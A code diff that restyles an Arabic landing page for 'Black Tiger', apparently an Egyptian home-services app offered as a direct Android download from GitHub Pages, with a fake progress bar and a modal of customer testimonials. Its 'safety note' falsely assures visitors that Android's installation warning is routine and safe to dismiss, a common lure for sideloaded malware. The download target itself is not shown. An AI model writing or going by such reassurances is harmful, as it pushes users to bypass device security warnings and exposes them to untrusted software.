@@ -2,82 +2,149 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     
-    <title>بلاك تايجر للخدمات المنزلية | تحميل التطبيق الرسمي</title>
-    <meta name="application-name" content="بلاك تايجر للخدمات المنزلية">
+    <title>بلاك تايجر للخدمات المنزلية | الموقع الرسمي</title>
     <meta name="description" content="تطبيق بلاك تايجر للخدمات المنزلية: المنصة الرائدة في مصر لتوفير عمالة النظافة، الطباخين، البيبي سيتر، وجليسات المسنين. اطلب خدمتك الآن.">
+    <meta name="application-name" content="بلاك تايجر">
+    <link rel="canonical" href="https://blacktiger-cmd.github.io/BlackTiger-App/">
 
-    <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "SoftwareApplication",
-      "name": "بلاك تايجر للخدمات المنزلية",
-      "operatingSystem": "ANDROID",
-      "applicationCategory": "BusinessApplication",
-      "description": "بلاك تايجر هي الشركة الرسمية والرائدة في مصر لتقديم الخدمات المنزلية. اطلب خدمتك الآن عبر تطبيقنا الرسمي على GitHub.",
-      "url": "https://blacktiger-cmd.github.io/BlackTiger-App/",
-      "author": {
-        "@type": "Organization",
-        "name": "بلاك تايجر مصر"
-      }
-    }
-    </script>
+    <meta property="og:title" content="بلاك تايجر - القوة في الخدمات المنزلية">
+    <meta property="og:description" content="حمّل تطبيقنا الآن وانضم لأكبر مجتمع خدمات منزلية في مصر.">
+    <meta property="og:image" content="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800">
+    <meta property="og:type" content="website">
+    <meta name="theme-color" content="#ff8c00">
 
     <link rel="icon" type="image/png" href="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=100">
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
     
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Cairo', sans-serif; background: #000; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #fff; margin: 0; overflow-x: hidden; }
-        .container { width: 90%; max-width: 400px; padding: 20px; text-align: center; }
-        .tiger-frame { width: 100%; height: 250px; border-radius: 30px; overflow: hidden; margin-bottom: 25px; border: 2px solid #ff8c00; box-shadow: 0 10px 30px rgba(255, 140, 0, 0.2); background: #111; }
-        .tiger-frame img { width: 100%; height: 100%; object-fit: cover; display: block; }
-        h1 { font-size: 36px; color: #ff8c00; font-weight: 900; margin-bottom: 5px; }
-        .subtitle { color: #888; font-size: 17px; margin-bottom: 35px; font-weight: 700; }
-        
-        .btn { background: linear-gradient(135deg, #ff8c00 0%, #d35400 100%); color: #fff; font-size: 22px; font-weight: 900; padding: 20px; border-radius: 20px; display: block; border: none; width: 100%; cursor: pointer; box-shadow: 0 12px 25px rgba(211, 84, 0, 0.4); margin-bottom: 15px; }
-        .btn-reviews { background: #1a1a1a; color: #ff8c00; border: 1px solid #ff8c00; font-size: 16px; padding: 12px; box-shadow: none; margin-bottom: 25px; }
-        
-        #loading-section { display: none; margin-bottom: 25px; }
-        .progress-bg { width: 100%; background: #222; height: 14px; border-radius: 20px; overflow: hidden; border: 1px solid #333; }
-        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff8c00, #ff4500); transition: width 0.3s ease; }
-        
-        #reviews-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 1000; padding: 20px; overflow-y: auto; text-align: right; }
-        .review-card { background: #111; padding: 15px; border-radius: 15px; margin-bottom: 12px; border-right: 4px solid #ff8c00; }
-        .review-card h4 { color: #ff8c00; font-size: 16px; margin-bottom: 5px; }
-        .review-card p { color: #ccc; font-size: 14px; }
+        :root {
+            --primary: #ff8c00;
+            --primary-dark: #d35400;
+            --bg-dark: #050505;
+            --card-bg: #121212;
+            --text-main: #ffffff;
+            --text-dim: #a0a0a0;
+        }
 
-        .safety-note { margin-top: 25px; font-size: 14px; color: #aaa; background: rgba(255, 140, 0, 0.05); padding: 15px; border-radius: 15px; border: 1px solid #222; }
-        .footer { margin-top: 40px; color: #333; font-size: 12px; font-weight: bold; }
+        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+        
+        body { 
+            font-family: 'Cairo', sans-serif; 
+            background-color: var(--bg-dark); 
+            background-image: radial-gradient(circle at top right, rgba(255,140,0,0.05), transparent),
+                              radial-gradient(circle at bottom left, rgba(255,140,0,0.05), transparent);
+            display: flex; justify-content: center; align-items: center; 
+            min-height: 100vh; color: var(--text-main); line-height: 1.6;
+        }
+
+        .container { 
+            width: 92%; max-width: 420px; padding: 35px 25px; text-align: center; 
+            background: rgba(18, 18, 18, 0.8); border-radius: 45px;
+            backdrop-filter: blur(15px); border: 1px solid rgba(255, 140, 0, 0.15);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
+            animation: fadeInPage 1s ease-out;
+        }
+
+        @keyframes fadeInPage { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        .tiger-frame { 
+            width: 100%; height: 260px; border-radius: 35px; overflow: hidden; 
+            margin-bottom: 30px; border: 2px solid var(--primary);
+            box-shadow: 0 10px 30px rgba(255, 140, 0, 0.3);
+            position: relative;
+        }
+
+        .tiger-frame img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.8s cubic-bezier(0.2, 1, 0.3, 1); }
+        .tiger-frame:hover img { transform: scale(1.15); }
+
+        h1 { font-size: 38px; color: var(--primary); font-weight: 900; letter-spacing: 1px; margin-bottom: 10px; }
+        .subtitle { color: var(--text-dim); font-size: 16px; margin-bottom: 40px; font-weight: 700; padding: 0 10px; }
+        
+        .btn-group { display: flex; flex-direction: column; gap: 15px; }
+
+        .btn { 
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%); 
+            color: #fff; font-size: 20px; font-weight: 900; padding: 18px; 
+            border-radius: 22px; border: none; width: 100%; cursor: pointer;
+            box-shadow: 0 10px 25px rgba(211, 84, 0, 0.3); 
+            transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+
+        .btn:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(211, 84, 0, 0.5); }
+        .btn:active { transform: translateY(0); }
+
+        .btn-reviews { 
+            background: rgba(255, 140, 0, 0.05); color: var(--primary); 
+            border: 1px solid var(--primary); box-shadow: none; font-size: 16px; margin-top: 5px;
+        }
+
+        #loading-section { display: none; margin-bottom: 25px; }
+        .progress-bg { width: 100%; background: #222; height: 12px; border-radius: 20px; overflow: hidden; border: 1px solid #333; }
+        .progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, var(--primary), #ff4500); transition: width 0.3s ease; box-shadow: 0 0 15px var(--primary); }
+        
+        #reviews-modal { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(0,0,0,0.98); z-index: 1000; padding: 25px; 
+            overflow-y: auto; text-align: right; backdrop-filter: blur(10px);
+        }
+
+        .modal-header { position: sticky; top: 0; background: rgba(0,0,0,0.8); padding: 10px 0; margin-bottom: 20px; border-bottom: 1px solid #333; z-index: 2; }
+
+        .review-card { 
+            background: var(--card-bg); padding: 20px; border-radius: 22px; margin-bottom: 15px; 
+            border-right: 5px solid var(--primary); transition: 0.3s;
+        }
+
+        .review-card h4 { color: var(--primary); font-size: 17px; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .review-card h4::after { content: "⭐"; font-size: 12px; }
+        .review-card p { color: #ddd; font-size: 14px; line-height: 1.7; }
+
+        .safety-note { 
+            margin-top: 30px; font-size: 13px; color: var(--text-dim); 
+            background: rgba(255, 140, 0, 0.03); padding: 20px; border-radius: 25px; 
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .footer { margin-top: 40px; color: #444; font-size: 11px; font-weight: bold; letter-spacing: 2px; }
+        
+        /* تحسينات لملء الشاشة على الموبايل */
+        @media (max-width: 480px) {
+            .container { width: 100%; height: 100vh; border-radius: 0; display: flex; flex-direction: column; justify-content: center; }
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="tiger-frame">
-        <img src="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Black Tiger">
+        <img src="https://images.pexels.com/photos/792381/pexels-photo-792381.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Black Tiger Official">
     </div>
     <h1>BLACK TIGER</h1>
-    <p class="subtitle"> أهلاً بك في تطبيق بلاك تايجر للخدمات المنزليه التطبيق الأقوى فى السوق المصريه </p>
+    <p class="subtitle"> أهلاً بك في تطبيق بلاك تايجر للخدمات المنزليه <br> التطبيق الأقوى فى السوق المصريه </p>
 
     <div id="loading-section">
         <div class="progress-bg"><div id="bar" class="progress-bar"></div></div>
-        <div id="msg" style="color: #ff8c00; margin-top: 10px; font-weight: 900;">جاري تحضير الملف... 0%</div>
+        <div id="msg" style="color: var(--primary); margin-top: 12px; font-weight: 900; font-size: 14px;">جاري تحضير الملف... 0%</div>
     </div>
     
-    <button id="main-btn" class="btn" onclick="startUpdate()">تحميل الآن</button>
-    <button id="rev-btn" class="btn btn-reviews" onclick="showReviews()">آراء أعضاء بلاك تايجر ⭐</button>
+    <div class="btn-group">
+        <button id="main-btn" class="btn" onclick="startUpdate()">تحميل التطبيق الآن</button>
+        <button id="rev-btn" class="btn btn-reviews" onclick="showReviews()">آراء مجتمع بلاك تايجر ⭐</button>
+    </div>
 
     <div class="safety-note">
-        <span>ملاحظة أمان:</span> تطبيقنا آمن تماماً، التحذير الذي قد يظهر أثناء التثبيت هو إجراء روتيني من نظام الأندرويد. يمكنك إتمام التثبيت بكل طمأنينة.
+        <span style="color: var(--primary);">ملاحظة أمان:</span> تطبيقنا مشفر ومؤمن بالكامل. التحذير أثناء التثبيت هو إجراء روتيني لأنظمة أندرويد لحماية الخصوصية.
     </div>
     
     <div class="footer">OFFICIAL BLACK TIGER © 2026</div>
 </div>
 
 <div id="reviews-modal">
-    <h2 style="color: #ff8c00; margin-bottom: 20px; text-align: center;">ماذا يقول أعضاؤنا؟</h2>
+    <div class="modal-header">
+        <h2 style="color: var(--primary); text-align: center;">ثقة عملائنا في مصر</h2>
+    </div>
     <div id="reviews-content">
         <div class="review-card"><h4>مدام نهى (التجمع)</h4><p>بصراحة كنت خايفة في الأول بس الشغالة اللي جتلي محترمة جداً وأمينة وخلصت شغلها بضمير.. شكراً ليكم.</p></div>
         <div class="review-card"><h4>أستاذ هاني (عامل بوفيه)</h4><p>التطبيق ده فتحلي باب رزق محترم، والشركة بتتعامل معانا بآدمية والفلوس بتوصل في ميعادها.</p></div>
@@ -104,12 +171,18 @@
         <div class="review-card"><h4>هدير (ربة منزل)</h4><p>مش هتعامل مع حد تاني غيركم، بجد ريحتوني من لفة المكاتب وضياع الوقت.</p></div>
         <div class="review-card"><h4>أ/ وائل (أكتوبر)</h4><p>بلاك تايجر يعني الأمان والثقة، بنصح أي حد عايز عمالة بيت يجربهم.</p></div>
     </div>
-    <button class="btn" onclick="hideReviews()">إغلاق</button>
+    <button class="btn" style="margin-top: 20px;" onclick="hideReviews()">العودة للتطبيق</button>
 </div>
 
 <script>
-    function showReviews() { document.getElementById('reviews-modal').style.display = 'block'; }
-    function hideReviews() { document.getElementById('reviews-modal').style.display = 'none'; }
+    function showReviews() { 
+        document.getElementById('reviews-modal').style.display = 'block';
+        document.body.style.overflow = 'hidden'; 
+    }
+    function hideReviews() { 
+        document.getElementById('reviews-modal').style.display = 'none';
+        document.body.style.overflow = 'auto';
+    }
     function startUpdate() {
         document.getElementById('main-btn').style.display = 'none';
         document.getElementById('rev-btn').style.display = 'none';
@@ -122,7 +195,7 @@
             } else {
                 p += 5;
                 document.getElementById('bar').style.width = p + '%';
-                document.getElementById('msg').innerHTML = "جاري تحضير ملفات النمر... " + p + "%";
+                document.getElementById('msg').innerHTML = "جاري تحضير الملف... " + p + "%";
             }
         }, 150);
     }
